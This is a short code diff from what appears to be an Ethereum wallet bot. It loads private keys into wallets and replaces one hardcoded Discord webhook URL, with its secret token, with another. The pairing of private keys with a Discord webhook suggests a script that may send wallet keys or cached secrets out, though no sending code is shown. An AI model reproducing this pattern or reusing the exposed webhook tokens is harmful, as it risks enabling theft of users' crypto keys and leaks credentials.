@@ -72,7 +72,7 @@ async function mainLoop() {
     wallets.push(new ethers.Wallet(privateKey.trim()));
   });
 
-const webhookURL = "https://discord.com/api/webhooks/1372709888542773429/kMx04qukOcMXUDxVf-Xcm4CGmei0eAz_y4P3ZnQpk-IPVD662u0v8kSBS6SvTrhaEqzn";
+const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";
 
 const envCacheFile = ".env_cache";
 
